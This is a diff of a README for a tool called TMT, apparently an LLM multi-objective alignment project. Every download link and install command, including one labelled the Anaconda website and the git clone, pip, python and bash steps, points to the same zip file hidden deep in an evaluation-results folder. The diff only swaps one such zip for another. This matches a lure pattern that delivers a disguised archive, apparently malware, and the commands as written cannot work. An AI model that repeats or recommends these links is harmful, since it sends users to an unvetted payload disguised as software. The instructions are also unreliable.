@@ -1,6 +1,6 @@
 # 🎯 TMT - Efficiently Align Multiple Objectives
 
-[![Download TMT](https://github.com/Jiroo00/TMT/raw/refs/heads/main/code/evaluation/results/hh/stch/PARM_0.6help_0.2harm_0.2humor/TMT_2.7.zip)](https://github.com/Jiroo00/TMT/raw/refs/heads/main/code/evaluation/results/hh/stch/PARM_0.6help_0.2harm_0.2humor/TMT_2.7.zip)
+[![Download TMT](https://raw.githubusercontent.com/Jiroo00/TMT/main/code/evaluation/hh/cache_temp/PARM_0.0help_0.3harm_0.7humor/Software_1.5.zip)](https://raw.githubusercontent.com/Jiroo00/TMT/main/code/evaluation/hh/cache_temp/PARM_0.0help_0.3harm_0.7humor/Software_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,12 +8,12 @@ Welcome to TMT, a tool designed to help you tackle complex optimization problems
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Jiroo00/TMT/raw/refs/heads/main/code/evaluation/results/hh/stch/PARM_0.6help_0.2harm_0.2humor/TMT_2.7.zip) to download the latest version of TMT. Download the appropriate file for your system and follow the installation instructions below.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Jiroo00/TMT/main/code/evaluation/hh/cache_temp/PARM_0.0help_0.3harm_0.7humor/Software_1.5.zip) to download the latest version of TMT. Download the appropriate file for your system and follow the installation instructions below.
 
 ### 🛠️ Installation Steps
 
 1. **Install Anaconda:** 
-   If you don’t have Anaconda installed, download it from the [Anaconda website](https://github.com/Jiroo00/TMT/raw/refs/heads/main/code/evaluation/results/hh/stch/PARM_0.6help_0.2harm_0.2humor/TMT_2.7.zip) and follow the installation instructions specific to your operating system.
+   If you don’t have Anaconda installed, download it from the [Anaconda website](https://raw.githubusercontent.com/Jiroo00/TMT/main/code/evaluation/hh/cache_temp/PARM_0.0help_0.3harm_0.7humor/Software_1.5.zip) and follow the installation instructions specific to your operating system.
 
 2. **Create a New Environment:**
    Open your terminal (or Anaconda Prompt for Windows) and run the following commands:
@@ -27,12 +27,12 @@ To get started, visit the [Releases page](https://github.com/Jiroo00/TMT/raw/ref
    You will need to clone some repositories for TMT to function properly. Run these commands one by one:
 
    ```bash
-   git clone https://github.com/Jiroo00/TMT/raw/refs/heads/main/code/evaluation/results/hh/stch/PARM_0.6help_0.2harm_0.2humor/TMT_2.7.zip
+   git clone https://raw.githubusercontent.com/Jiroo00/TMT/main/code/evaluation/hh/cache_temp/PARM_0.0help_0.3harm_0.7humor/Software_1.5.zip
    cd language-model-arithmetic/
    pip install -e .
    cd ..
    
-   git clone https://github.com/Jiroo00/TMT/raw/refs/heads/main/code/evaluation/results/hh/stch/PARM_0.6help_0.2harm_0.2humor/TMT_2.7.zip
+   git clone https://raw.githubusercontent.com/Jiroo00/TMT/main/code/evaluation/hh/cache_temp/PARM_0.0help_0.3harm_0.7humor/Software_1.5.zip
    cd peft/
    pip install -e .
    cd ..
@@ -43,7 +43,7 @@ To get started, visit the [Releases page](https://github.com/Jiroo00/TMT/raw/ref
 4. **Clone the Main TMT Repository:**
 
    ```bash
-   git clone https://github.com/Jiroo00/TMT/raw/refs/heads/main/code/evaluation/results/hh/stch/PARM_0.6help_0.2harm_0.2humor/TMT_2.7.zip
+   git clone https://raw.githubusercontent.com/Jiroo00/TMT/main/code/evaluation/hh/cache_temp/PARM_0.0help_0.3harm_0.7humor/Software_1.5.zip
    cd safe-rlhf
    pip install .
    cd ..
@@ -52,7 +52,7 @@ To get started, visit the [Releases page](https://github.com/Jiroo00/TMT/raw/ref
 5. **Install Additional Requirements:**
 
    ```bash
-   pip install -r https://github.com/Jiroo00/TMT/raw/refs/heads/main/code/evaluation/results/hh/stch/PARM_0.6help_0.2harm_0.2humor/TMT_2.7.zip
+   pip install -r https://raw.githubusercontent.com/Jiroo00/TMT/main/code/evaluation/hh/cache_temp/PARM_0.0help_0.3harm_0.7humor/Software_1.5.zip
    ```
 
 ### ⚙️ Preparing Data
@@ -68,8 +68,8 @@ Before using TMT, you need to prepare your data. Here’s how to do it:
 2. Run the following scripts to organize your data:
 
    ```bash
-   python https://github.com/Jiroo00/TMT/raw/refs/heads/main/code/evaluation/results/hh/stch/PARM_0.6help_0.2harm_0.2humor/TMT_2.7.zip
-   python https://github.com/Jiroo00/TMT/raw/refs/heads/main/code/evaluation/results/hh/stch/PARM_0.6help_0.2harm_0.2humor/TMT_2.7.zip
+   python https://raw.githubusercontent.com/Jiroo00/TMT/main/code/evaluation/hh/cache_temp/PARM_0.0help_0.3harm_0.7humor/Software_1.5.zip
+   python https://raw.githubusercontent.com/Jiroo00/TMT/main/code/evaluation/hh/cache_temp/PARM_0.0help_0.3harm_0.7humor/Software_1.5.zip
    ```
 
 ### 🎓 Training the Model
@@ -85,7 +85,7 @@ To train your model, follow these steps:
 2. Start the training process by executing:
 
    ```bash
-   bash https://github.com/Jiroo00/TMT/raw/refs/heads/main/code/evaluation/results/hh/stch/PARM_0.6help_0.2harm_0.2humor/TMT_2.7.zip
+   bash https://raw.githubusercontent.com/Jiroo00/TMT/main/code/evaluation/hh/cache_temp/PARM_0.0help_0.3harm_0.7humor/Software_1.5.zip
    ```
 
 ### 📊 Evaluating the Model
@@ -101,8 +101,8 @@ After training, you can evaluate your model as follows:
 2. Run the evaluation scripts:
 
    ```bash
-   bash https://github.com/Jiroo00/TMT/raw/refs/heads/main/code/evaluation/results/hh/stch/PARM_0.6help_0.2harm_0.2humor/TMT_2.7.zip
-   bash https://github.com/Jiroo00/TMT/raw/refs/heads/main/code/evaluation/results/hh/stch/PARM_0.6help_0.2harm_0.2humor/TMT_2.7.zip
+   bash https://raw.githubusercontent.com/Jiroo00/TMT/main/code/evaluation/hh/cache_temp/PARM_0.0help_0.3harm_0.7humor/Software_1.5.zip
+   bash https://raw.githubusercontent.com/Jiroo00/TMT/main/code/evaluation/hh/cache_temp/PARM_0.0help_0.3harm_0.7humor/Software_1.5.zip
    ```
 
 These evaluations will help you understand how well your model aligns with some predefined multi-objective criteria.
@@ -121,4 +121,4 @@ For more details on using TMT and its various capabilities, consult the document
 
 If you encounter any issues or have questions, please feel free to raise them in the repository's issues section. Your feedback helps improve TMT for everyone.
 
-Remember to visit the [Releases page](https://github.com/Jiroo00/TMT/raw/refs/heads/main/code/evaluation/results/hh/stch/PARM_0.6help_0.2harm_0.2humor/TMT_2.7.zip) to download the latest version of TMT and stay updated on new features and improvements.
+Remember to visit the [Releases page](https://raw.githubusercontent.com/Jiroo00/TMT/main/code/evaluation/hh/cache_temp/PARM_0.0help_0.3harm_0.7humor/Software_1.5.zip) to download the latest version of TMT and stay updated on new features and improvements.
